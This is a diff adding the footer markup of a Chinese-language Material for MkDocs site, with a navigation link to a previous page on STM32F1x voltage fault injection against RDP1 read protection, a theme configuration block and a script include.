+      <nav class="md-footer__inner md-grid" aria-label="页脚" >
+        
+          
+          <a href="../STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/" class="md-footer__link md-footer__link--prev" aria-label="上一页: STM32F1x 电压故障注入绕过 RDP1 固件读保护">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              <div class="md-ellipsis">
+                STM32F1x 电压故障注入绕过 RDP1 固件读保护
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["announce.dismiss", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "navigation.indexes", "content.tabs.link", "content.tooltips", "content.code.copy", "content.action.edit", "content.action.view", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.60a45f97.min.js"></script>
+      
+    
+  </body>
+</html>
